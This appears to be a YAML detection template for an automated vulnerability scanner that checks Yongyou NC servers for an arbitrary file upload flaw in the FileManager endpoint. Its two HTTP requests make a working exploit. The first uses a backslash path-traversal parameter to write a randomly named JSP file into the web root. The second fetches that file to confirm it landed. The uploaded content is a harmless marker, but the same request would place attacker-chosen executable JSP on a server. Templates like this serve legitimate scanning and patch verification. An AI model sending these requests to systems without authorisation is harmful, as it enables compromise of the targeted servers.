id: poc-yaml-yongyou-nc-filemanager-anyfile-upload
info:
  name: Yongyou NC FileManager Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: fileupload

variables:
  t1: "{{rand_base(4)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C
    headers:
      Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
    body: |-
      --d0b7a0d40eed0e32904c8017b09eb305
      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
      Content-Type: text/plain

      {{t2}}
      --d0b7a0d40eed0e32904c8017b09eb305--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ".jsp"
          - "nc_web"
      - type: word
        part: body
        words:
          - "<"
        negative: true

  - id: verify-file
    method: GET
    path:
      - /{{t1}}.jsp
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
